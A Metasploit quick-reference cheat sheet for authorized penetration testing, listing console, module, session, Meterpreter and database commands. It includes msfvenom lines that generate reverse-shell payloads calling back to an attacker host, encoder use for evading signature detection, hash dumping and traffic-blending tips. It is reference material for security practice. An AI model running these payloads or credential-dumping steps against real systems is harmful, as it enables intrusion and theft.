# Metasploit Cheat Sheet
**Exploitation Framework — Quick Reference**

---

## Core Workflow

1. Confirm authorization + isolated lab/engagement scope
2. Recon target (often via imported Nmap data)
3. Search for a matching module
4. Configure module options (`RHOSTS`, `LHOST`, `PAYLOAD`)
5. Execute and manage the resulting session
6. Post-exploitation, then clean up

---

## Console Basics

| Command | Purpose |
|---|---|
| `msfconsole` | Launch the interactive console |
| `search <term>` | Search modules by keyword |
| `search cve:<CVE-ID>` | Search modules by CVE |
| `use <module path>` | Select a module |
| `info` | Show details on the currently selected module |
| `back` | Deselect current module |

---

## Configuring a Module

| Command | Purpose |
|---|---|
| `show options` | Display required/optional settings |
| `show payloads` | List compatible payloads for the selected exploit |
| `show targets` | List specific target variants (OS/version) |
| `set RHOSTS <ip>` | Set target host(s) |
| `set RPORT <port>` | Set target port |
| `set LHOST <ip>` | Set local (attacker) host for callback |
| `set LPORT <port>` | Set local port for callback |
| `set PAYLOAD <payload>` | Set the payload to deliver |
| `setg <option> <value>` | Set an option globally (persists across module switches) |
| `exploit` / `run` | Execute the module |

---

## Module Types

| Type | Purpose |
|---|---|
| **exploit** | Code that takes advantage of a specific vulnerability |
| **payload** | Code delivered/executed after successful exploitation |
| **auxiliary** | Scanning, fuzzing, DoS — non-exploit utility modules |
| **post** | Post-exploitation actions (privilege escalation, credential harvesting) |
| **encoder** | Obfuscates payloads (e.g., to avoid basic signature detection) |
| **nop** | No-op generators, used in payload construction |

---

## Common Payload Types

| Payload Pattern | Behavior |
|---|---|
| `cmd/unix/reverse` | Simple reverse shell (Unix) |
| `windows/meterpreter/reverse_tcp` | Full Meterpreter session over TCP (Windows) |
| `windows/meterpreter/reverse_https` | Meterpreter over HTTPS (better blends with normal traffic) |
| `linux/x86/meterpreter/reverse_tcp` | Meterpreter session (Linux, x86) |

**Staged vs. stageless:** staged payloads (smaller initial payload, stages loaded after) vs. stageless (`_stageless` suffix — full payload sent at once, more reliable but larger).

---

## Session Management

| Command | Purpose |
|---|---|
| `sessions -l` | List all active sessions |
| `sessions -i <id>` | Interact with a specific session |
| `background` (or `Ctrl+Z`) | Background the current session without closing it |
| `sessions -k <id>` | Kill a specific session |

---

## Meterpreter Quick Commands

| Command | Purpose |
|---|---|
| `sysinfo` | Display target system information |
| `getuid` | Show current user context |
| `ps` | List running processes |
| `migrate <pid>` | Move Meterpreter into another process |
| `hashdump` | Dump password hashes (Windows SAM) |
| `screenshot` | Capture the target's screen |
| `download <file>` / `upload <file>` | Transfer files to/from target |
| `shell` | Drop into a native OS shell from Meterpreter |

---

## msfvenom (Standalone Payload Generation)

| Command | Purpose |
|---|---|
| `msfvenom -l payloads` | List all available payloads |
| `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe > payload.exe` | Generate a Windows executable payload |
| `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f elf > payload.elf` | Generate a Linux ELF payload |
| `msfvenom -p php/meterpreter_reverse_tcp LHOST=<ip> LPORT=<port> -f raw > payload.php` | Generate a PHP payload |
| `-e <encoder> -i <iterations>` | Apply an encoder (e.g., `x86/shikata_ga_nai`) with N iterations |

---

## Database & Workspace

| Command | Purpose |
|---|---|
| `db_status` | Check database connection status |
| `workspace` | List/manage workspaces (separate engagements) |
| `db_nmap <options> <target>` | Run Nmap and import results directly into Metasploit's database |
| `hosts` | List hosts discovered/stored in the current workspace |
| `services` | List known services across stored hosts |
| `vulns` | List vulnerabilities tracked in the workspace |

---

## Pro Tips

- **`db_nmap` beats copy-pasting Nmap results** — it pipes recon straight into Metasploit's workspace, ready for `hosts`/`services` lookups.
- **Use `setg` for values that don't change often** (like `LHOST`) — saves resetting it every time you switch modules.
- **`reverse_https` payloads blend better with normal traffic** than plain `reverse_tcp` — useful for understanding detection evasion concepts.
- **`migrate` in Meterpreter improves session stability** — moving out of a crash-prone process (e.g., the one you just exploited) into a stable one (e.g., `explorer.exe`) keeps your session alive longer.
- **Always confirm `RHOSTS`/`LHOST` before hitting `exploit`** — a fast way to accidentally target the wrong machine in a shared lab environment.
